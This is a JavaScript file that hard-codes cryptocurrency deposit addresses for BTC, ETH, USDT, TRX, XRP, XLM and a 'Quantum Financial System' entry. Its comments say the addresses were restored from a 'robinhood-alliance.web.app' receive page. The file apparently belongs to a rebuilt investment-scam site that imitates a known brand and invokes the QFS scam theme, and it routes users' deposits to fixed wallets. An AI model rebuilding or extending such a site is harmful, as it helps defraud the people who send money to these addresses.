/**
 * Deposit addresses restored from the original robinhood-alliance.web.app
 * receive pages (exact values). NEVER invent addresses — missing coins stay empty.
 */
(function (global) {
  'use strict';
  // Keys: page slug AND wallet currency key (lowercase)
  var DEPOSIT_ADDRESSES = {
    bitcoin: 'bc1qg2d4srgvu325u38s4yulw0acqflaylmmdlrufz',
    btc: 'bc1qg2d4srgvu325u38s4yulw0acqflaylmmdlrufz',
    ethereum: '0xF4c84Ed4cC9646AfF656Ad655eDD98C28aA997Fc',
    eth: '0xF4c84Ed4cC9646AfF656Ad655eDD98C28aA997Fc',
    usdt: '0xF4c84Ed4cC9646AfF656Ad655eDD98C28aA997Fc',
    // USDT ERC20 (same as original usdt receive page)
    bnb: '0xF4c84Ed4cC9646AfF656Ad655eDD98C28aA997Fc',
    tron: 'TBxoHobHYfxD5meMnwz1RT1N9a14ZGv2bq',
    trx: 'TBxoHobHYfxD5meMnwz1RT1N9a14ZGv2bq',
    // USDT TRC20 (original user/dashboard/receive/usdtrc.html)
    usdtrc: 'TBxoHobHYfxD5meMnwz1RT1N9a14ZGv2bq',
    ripple: 'rahjqBJ5fTHrUhkT5A66UjrMxHioTFWsFp',
    xrp: 'rahjqBJ5fTHrUhkT5A66UjrMxHioTFWsFp',
    stellar_lumens: 'GBVAGP24NZ2BN6CEL37OITCGUWQROUIKLTSRX6CZ3Q2FORTF4BAXPJEJ',
    xlm: 'GBVAGP24NZ2BN6CEL37OITCGUWQROUIKLTSRX6CZ3Q2FORTF4BAXPJEJ',
    quantumfinancialsystem: '0xF4c84Ed4cC9646AfF656Ad655eDD98C28aA997Fc',
    qfs: '0xF4c84Ed4cC9646AfF656Ad655eDD98C28aA997Fc'
  };

  function lookupDepositAddress(currencyOrSlug) {
    if (currencyOrSlug == null) return '';
    var k = String(currencyOrSlug).trim().toLowerCase();
    if (DEPOSIT_ADDRESSES[k]) return DEPOSIT_ADDRESSES[k];
    // walletKeyFor mapping
    if (global.RA && typeof RA.walletKeyFor === 'function') {
      var wk = RA.walletKeyFor(k);
      if (wk && DEPOSIT_ADDRESSES[wk]) return DEPOSIT_ADDRESSES[wk];
    }
    return '';
  }

  global.RA_DEPOSIT_ADDRESSES = DEPOSIT_ADDRESSES;
  global.RA_lookupDepositAddress = lookupDepositAddress;
  if (global.RA) {
    global.RA.DEPOSIT_ADDRESSES = DEPOSIT_ADDRESSES;
    global.RA.lookupDepositAddress = lookupDepositAddress;
  }
})(typeof window !== 'undefined' ? window : this);
